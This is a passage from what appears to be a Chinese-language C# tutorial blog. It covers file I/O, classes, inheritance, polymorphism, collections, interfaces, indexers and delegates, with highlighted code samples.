class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">FileIO</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">ReadFile</span>(<span class="params"><span class="built_in">string</span> filePath</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">using</span> (FileStream fs = <span class="keyword">new</span> FileStream(filePath, FileMode.Open))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">using</span> (StreamReader reader = <span class="keyword">new</span> StreamReader(fs, Encoding.UTF8))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">return</span> reader.ReadToEnd();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;An error occurred while reading the file: &quot;</span> + ex.Message);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">WriteFile</span>(<span class="params"><span class="built_in">string</span> filePath, <span class="built_in">string</span> content</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">using</span> (FileStream fs = <span class="keyword">new</span> FileStream(filePath, FileMode.Create))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">using</span> (StreamWriter writer = <span class="keyword">new</span> StreamWriter(fs, Encoding.UTF8))</span><br><span class="line">                &#123;</span><br><span class="line">                    writer.Write(content);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;An error occurred while writing to the file: &quot;</span> + ex.Message);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="六、类与对象"><a href="#六、类与对象" class="headerlink" title="六、类与对象"></a>六、类与对象</h2><blockquote><p><a href="https://github.com/Magialeaf/Game/tree/main/Untiy/Scripts/List.cs">my::简单线性表</a></p><p><a href="https://github.com/Magialeaf/Game/tree/main/Untiy/Scripts/Direction.cs">my::二维数组方向</a></p></blockquote><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1 定义"></a>1 定义</h3><blockquote><p>一般情况：数据私有，方法公开。</p><p>类中方法外的变量：</p><ol><li>具有默认值</li><li>存于堆。</li><li>可以与局部变量重名。（用this.区分）</li></ol><p>类中的值：声明存在堆中，值也存于堆。</p><p>类中的引用：声明存在堆中，值也存在堆中，但是是存于另一个堆。</p></blockquote><p>访问级别：</p><ul><li>public  ：公有访问。不受任何限制，任何地方都可以引用，特殊场景不安全</li><li>private  ：私有访问。只限于本类成员访问，子类，实例都不能访问，可以用在本类种独有的方法。</li><li>protected  ：保护访问。只限于本类和子类访问，实例不能访问。</li><li>internal  ：内部访问。只限于本项目内访问，其他项目不能访问。</li><li>protected internal 组合：内部保护访问。只限于本项目或是子类访问，其他项目不能访问。</li></ul><p>修饰符：</p><ul><li>static：静态的（同类型类共用一个变量，通过类名调用）（类被加载时静态成员就存在）</li></ul><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 修饰符 访问级别  class  类名（推荐首字母大写）  &#123; 类成员... &#125;</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Name</span>()</span>&#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="2-类中成员"><a href="#2-类中成员" class="headerlink" title="2 类中成员"></a>2 类中成员</h3><blockquote><p>构造函数：（访问级别）（类名）（）{ }</p><p>new的时候使用的是构造函数。</p><p>一个类无构造函数会自动给一个无参构造函数。</p><p>构造函数：this( 本构造函数参数 ) 可以调用另一个构造函数。</p></blockquote><p>构造函数级别：</p><ul><li>public：公开类，创建对象时初始化。</li><li>private：无法在类外用这个类（称为单例）。</li><li>static：初始化类的静态数据成员，类被加载时调用一次。</li></ul><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 类 &#123; 字段  属性  构造函数  方法 &#125;，一般类中有属性和方法即可。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Calculate</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 字段：类中元素。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">int</span> a;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">int</span> b;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 属性：一般用于规定字段的读写。</span></span><br><span class="line">    <span class="comment">// get可读，set可写。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> A </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">get</span> &#123; <span class="keyword">return</span> a; &#125;</span><br><span class="line">        <span class="keyword">set</span> &#123; a = <span class="keyword">value</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> B</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">get</span> &#123; <span class="keyword">return</span> b; &#125;</span><br><span class="line">        <span class="keyword">set</span> &#123; b = <span class="keyword">value</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 自动属性：包含一个字段（数据）和两个方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> C &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造函数：new的时候调用的函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Calculate</span>(<span class="params"><span class="built_in">int</span> a</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.A = a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Calculate</span>(<span class="params"><span class="built_in">int</span> a, <span class="built_in">int</span> b</span>) : <span class="title">this</span>(<span class="params">a</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.B = b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 析构函数：对象被销毁时被调用</span></span><br><span class="line">    ~Calculate()</span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;End!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 方法：函数。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">int</span> <span class="title">add</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        C = A + B;</span><br><span class="line">        Console.WriteLine(C);</span><br><span class="line">        <span class="keyword">return</span> C;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 销毁自身方法，调用后触发析构函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dispose</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        GC.SuppressFinalize(<span class="keyword">this</span>);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-使用"><a href="#3-使用" class="headerlink" title="3 使用"></a>3 使用</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数据成员的引用</span></span><br><span class="line"><span class="keyword">this</span>.name;</span><br><span class="line"><span class="comment">// 声明Wife类型的引用</span></span><br><span class="line">Wife wife01;</span><br><span class="line"><span class="comment">// Wife类型实例化</span></span><br><span class="line">wife01 = <span class="keyword">new</span> Wife();</span><br></pre></td></tr></table></figure><h3 id="4-继承"><a href="#4-继承" class="headerlink" title="4 继承"></a>4 继承</h3><blockquote><p>子类可以用父类公共和保护类型代码，父类不能用子类代码。</p><p>父类私有代码子类不可以使用。</p><p>静态类不能被继承，但是静态方法和属性可以被继承。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title">Animal</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Eat</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;动物正在进食...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 子类，此时Dog类拥有Animal类中的公共和保护类型代码。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title">Dog</span> : <span class="title">Animal</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Bark</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;狗在汪汪叫！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Dog dog = <span class="keyword">new</span> Dog();</span><br><span class="line">        dog.Eat();  <span class="comment">// 调用父类的方法</span></span><br><span class="line">        dog.Bark(); <span class="comment">// 调用子类的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">// 动物正在进食...</span></span><br><span class="line"><span class="comment">// 狗在汪汪叫！</span></span><br></pre></td></tr></table></figure><h3 id="5-引用"><a href="#5-引用" class="headerlink" title="5 引用"></a>5 引用</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//父类型的引用指向子类的对象。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//只能使用父类成员。</span></span><br><span class="line">Person person02 =<span class="keyword">new</span> Student(); </span><br><span class="line"></span><br><span class="line"><span class="comment">//如果需要访问该子类成员，需要强制类型转换。</span></span><br><span class="line">Student stu02 = (Student)person02;</span><br><span class="line"></span><br><span class="line"><span class="comment">//转化成其他家族成员会抛出异常。</span></span><br><span class="line">Teacher teacher02 =(Teacher)person02;</span><br><span class="line">teacher02.Salary = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//若可以运行则不抛出异常，people = null。</span></span><br><span class="line">teacher people = student <span class="keyword">as</span> teacher;</span><br></pre></td></tr></table></figure><h3 id="6-多态"><a href="#6-多态" class="headerlink" title="6 多态"></a>6 多态</h3><blockquote><p>静态多态性：编译时绑定方法关系。</p><p>动态多态性：运行时绑定方法关系。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 静态多态</span></span><br><span class="line"><span class="comment">// 函数重载</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Adds</span></span><br><span class="line">&#123;     </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">int</span> <span class="title">Add</span>(<span class="params"><span class="built_in">int</span> a, <span class="built_in">int</span> b</span>)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">return</span> a + b;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">int</span> <span class="title">Add</span>(<span class="params"><span class="built_in">int</span> a, <span class="built_in">int</span> b, <span class="built_in">int</span> c</span>)</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">return</span> a + b + c;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">// 运算符重载</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Box <span class="keyword">operator</span>+ (Box a, Box b)</span><br><span class="line">&#123;</span><br><span class="line">    Box res = <span class="keyword">new</span> Box();</span><br><span class="line">    res.length = a.length + b.length;</span><br><span class="line">    <span class="keyword">return</span> res.length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态多态</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="7-虚方法"><a href="#7-虚方法" class="headerlink" title="7 虚方法"></a>7 虚方法</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 重写虚方法就调用子类，不重写则调用父类</span></span><br><span class="line"><span class="comment">// 父</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 子</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 调用父类Start()</span></span><br><span class="line">    <span class="keyword">base</span>.Start();</span><br><span class="line">    ...;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="七、集合"><a href="#七、集合" class="headerlink" title="七、集合"></a>七、集合</h2><blockquote><p>内置的数据结构。</p><p>泛型和非泛型函数名是一样的。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 非泛型集合</span></span><br><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="comment">// 泛型集合</span></span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br></pre></td></tr></table></figure><h3 id="1-List"><a href="#1-List" class="headerlink" title="1 List"></a>1 List</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 非泛型列表</span></span><br><span class="line">ArrayList list = <span class="keyword">new</span> ArrayList();</span><br><span class="line"><span class="comment">// 泛型列表</span></span><br><span class="line">List&lt;T&gt; list = <span class="keyword">new</span> List&lt;T&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个空的整数列表</span></span><br><span class="line">List&lt;<span class="built_in">int</span>&gt; numbers = <span class="keyword">new</span> List&lt;<span class="built_in">int</span>&gt;(); </span><br><span class="line"><span class="comment">// 创建一个包含初始元素的字符串列表</span></span><br><span class="line">List&lt;<span class="built_in">string</span>&gt; names = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt; &#123; <span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Charlie&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列表长度</span></span><br><span class="line">list.Count; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问元素</span></span><br><span class="line">list[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// 访问末尾元素</span></span><br><span class="line">list.Last();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查找指定元素的索引</span></span><br><span class="line">IndexOf(elem); </span><br><span class="line"><span class="comment">// 判断列表是否包含指定元素</span></span><br><span class="line">list.Contains(elem); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 在列表末尾添加一个元素</span></span><br><span class="line">list.Add(elem); </span><br><span class="line"><span class="comment">// 在指定索引位置插入一个元素</span></span><br><span class="line">list.Insert(idx, elem); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除指定的元素</span></span><br><span class="line">list.Remove(elem);</span><br><span class="line"><span class="comment">// 删除指定索引位置的元素</span></span><br><span class="line">list.RemoveAt(idx); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 升序排序</span></span><br><span class="line">list.Sort(); </span><br><span class="line"><span class="comment">// 反转列表</span></span><br><span class="line">list.Reverse(); </span><br></pre></td></tr></table></figure><h3 id="2-Dictory"><a href="#2-Dictory" class="headerlink" title="2 Dictory"></a>2 Dictory</h3><blockquote><p>字典</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 非泛型字典</span></span><br><span class="line">Hashtable dict = <span class="keyword">new</span> Hashtable();</span><br><span class="line"><span class="comment">// 泛型字典</span></span><br><span class="line">Dictionary&lt;key,<span class="keyword">value</span>&gt; dict = <span class="keyword">new</span> Dictionary&lt;key,<span class="keyword">value</span>&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构建字典（key,value）</span></span><br><span class="line">Dictionary&lt;key, <span class="keyword">value</span>&gt; dict = <span class="keyword">new</span> Dictionary&lt;key, <span class="keyword">value</span>&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 键和值</span></span><br><span class="line">dict.Keys;</span><br><span class="line">dict.Values;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得值元素的唯一标识符</span></span><br><span class="line"><span class="keyword">value</span>.GetInstanceID();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加元素</span></span><br><span class="line">dict.Add(key, <span class="keyword">value</span>);</span><br></pre></td></tr></table></figure><h3 id="3-Stack"><a href="#3-Stack" class="headerlink" title="3 Stack"></a>3 Stack</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 非泛型栈</span></span><br><span class="line">Stack stack = <span class="keyword">new</span> Stack();</span><br><span class="line"><span class="comment">// 泛型栈</span></span><br><span class="line">Stack&lt;T&gt; stack = <span class="keyword">new</span> Stack&lt;T&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入栈</span></span><br><span class="line">stack.Push(<span class="string">&quot;str&quot;</span>);</span><br><span class="line"><span class="comment">// 出栈</span></span><br><span class="line">stack.Pop();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读去栈顶</span></span><br><span class="line">stack.Peek();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 栈总数</span></span><br><span class="line">stack.Count();</span><br></pre></td></tr></table></figure><h3 id="4-Queue"><a href="#4-Queue" class="headerlink" title="4 Queue"></a>4 Queue</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 非泛型队列</span></span><br><span class="line">Queue queue = <span class="keyword">new</span> Queue();</span><br><span class="line"><span class="comment">// 泛型队列</span></span><br><span class="line">Queue&lt;T&gt; queue = <span class="keyword">new</span> Queue&lt;T&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入队</span></span><br><span class="line">queue.Enqueue(<span class="string">&quot;str&quot;</span>);</span><br><span class="line"><span class="comment">// 出队</span></span><br><span class="line">queue.Dequeue();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读队首</span></span><br><span class="line">queue.Peek();</span><br><span class="line"><span class="comment">// 队长</span></span><br><span class="line">queue.Count();</span><br></pre></td></tr></table></figure><hr><h2 id="八、高级"><a href="#八、高级" class="headerlink" title="八、高级"></a>八、高级</h2><h3 id="1-结构体"><a href="#1-结构体" class="headerlink" title="1 结构体"></a>1 结构体</h3><blockquote><p>与类语法相似，但结构体属于值类型，类属于引用类型。</p><p>区别：结构体包含的无参数构造函数要给所有属性先赋值。</p><p>适用：点，颜色等轻量级对象。</p></blockquote><h3 id="2-接口"><a href="#2-接口" class="headerlink" title="2 接口"></a>2 接口</h3><blockquote><p>接口中相当于填入方法的声明，继承接口的类要实现接口的所有方法。</p><p>接口默认公开，接口不能实例化。</p><p>接口可以继承接口。类只可以继承一个基类，但是可以继承多个接口。</p><p>接口常用于实现多态，代码框架等方面。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义接口</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title">IMyInterface</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">WriteLine</span>()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 继承类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title">MyWriteSome</span> : <span class="title">IMyInterface</span>()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">WriteLine</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义动物接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">IAnimal</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">MakeSound</span>()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现动物接口的基础抽象类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title">Animal</span> : <span class="title">IAnimal</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">MakeSound</span>()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 鸟类继承自动物抽象类并实现其方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Bird</span> : <span class="title">Animal</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">MakeSound</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Bird is chirping.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 狗类继承自动物抽象类但没有实现接口的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Dog</span> : <span class="title">Animal</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">MakeSound</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Console.WriteLine(<span class="string">&quot;Dog is barking.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 创建鸟类对象</span></span><br><span class="line">        Bird bird = <span class="keyword">new</span> Bird();</span><br><span class="line">        bird.MakeSound(); <span class="comment">// 输出：Bird is chirping.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建狗类对象</span></span><br><span class="line">        Dog dog = <span class="keyword">new</span> Dog();</span><br><span class="line">        dog.MakeSound(); <span class="comment">// 输出：Dog is barking.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用接口引用不同类型的动物对象</span></span><br><span class="line">        IAnimal animal1 = <span class="keyword">new</span> Bird();</span><br><span class="line">        animal1.MakeSound(); <span class="comment">// 输出：Bird is chirping.</span></span><br><span class="line"></span><br><span class="line">        IAnimal animal2 = <span class="keyword">new</span> Dog();</span><br><span class="line">        animal2.MakeSound(); <span class="comment">// 输出：Dog is barking.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-特性"><a href="#3-特性" class="headerlink" title="3 特性"></a>3 特性</h3><h3 id="4-反射"><a href="#4-反射" class="headerlink" title="4 反射"></a>4 反射</h3><h3 id="5-索引器"><a href="#5-索引器" class="headerlink" title="5 索引器"></a>5 索引器</h3><blockquote><p>写在类中，类似于重载了类的索引。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 语法：element-type this[int index]</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> <span class="keyword">this</span>[<span class="built_in">int</span> index]</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">get</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> tmp;</span><br><span class="line">        <span class="keyword">if</span>( index &gt;= <span class="number">0</span> &amp;&amp; index &lt;= size<span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            tmp = namelist[index];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            tmp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ( tmp );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">set</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( index &gt;= <span class="number">0</span> &amp;&amp; index &lt;= size<span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            namelist[index] = <span class="keyword">value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-委托"><a href="#6-委托" class="headerlink" title="6 委托"></a>6 委托</h3><blockquote><p>委托是存有对某个方法的引用的一种引用类型变量，用于实现事件和回调方法，所有的委托都派生自System.Delegate类。</p><p>委托对象可以通过加减合并，形成调用列表。这称为委托的多播。内部数据结构是一个队列，先进先出。</p></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 普通委托使用</span></span><br><span class="line"><span class="comment">// 声明，语法：delegate &lt;return type&gt; &lt;delegate-name&gt; (parameter list)</span></span><br><span class="line"><span class="function"><span class="built_in">delegate</span> <span class="built_in">int</span> <span class="title">NumberChanger</span>(<span class="params"><span class="built_in">int</span> n</span>)</span>;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Test1</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">class</span> <span class="title">Test</span></span><br><span class="line">   &#123;</span><br><span class="line">      <span class="keyword">static</span> <span class="built_in">int</span> num = <span class="number">10</span>;</span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">int</span> <span class="title">AddNum</span>(<span class="params"><span class="built_in">int</span> p</span>)</span></span><br><span class="line">      &#123;</span><br><span class="line">         num += p;</span><br><span class="line">         <span class="keyword">return</span> num;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">int</span> <span class="title">MultNum</span>(<span class="params"><span class="built_in">int</span> q</span>)</span></span><br><span class="line">      &#123;</span><br><span class="line">         num *= q;</span><br><span class="line">         <span class="keyword">return</span> num;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">int</span> <span class="title">getNum</span>()</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">return</span> num;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="comment">// 创建委托实例</span></span><br><span class="line">         NumberChanger nc1 = <span class="keyword">new</span> NumberChanger(AddNum);</span><br><span class="line">         NumberChanger nc2 = <span class="keyword">new</span> NumberChanger(MultNum);</span><br><span class="line">         <span class="comment">// 使用委托对象调用方法</span></span><br><span class="line">         nc1(<span class="number">25</span>);</span><br><span class="line">         Console.WriteLine(<span class="string">&quot;Value of Num: &#123;0&#125;&quot;</span>, getNum());</span><br><span class="line">         nc2(<span class="number">5</span>);</span><br><span class="line">         Console.WriteLine(<span class="string">&quot;Value of Num: &#123;0&#125;&quot;</span>, getNum());</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 委托的多播</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建委托实例</span></span><br><span class="line">    NumberChanger nc;</span><br><span class="line">    NumberChanger nc1 = <span class="keyword">new</span> NumberChanger(AddNum);</span><br><span class="line">    NumberChanger nc2 = <span class="keyword">new</span> NumberChanger(MultNum);</span><br><span class="line">    nc = nc1;</span><br><span class="line">    nc += nc2;</span><br><span class="line">    <span class="comment">// 调用多播</span></span><br><span class="line">    nc(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">// 输出75，委托按顺序全部执行了。</span></span><br><span class="line">    Console.WriteLine(<span class="string">&quot;Value of Num: &#123;0&#125;&quot;</span>, getNum());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 常用的内置委托类型：Action和Func。Action无返回值，Func有返回值。</span></span><br><span class="line"><span class="comment">// 1.使用Action定义一个不带参数的方法</span></span><br><span class="line">Action sayHello = () =&gt; Console.WriteLine(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">sayHello();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.使用Action定义一个带有参数的方法</span></span><br><span class="line">Action&lt;<span 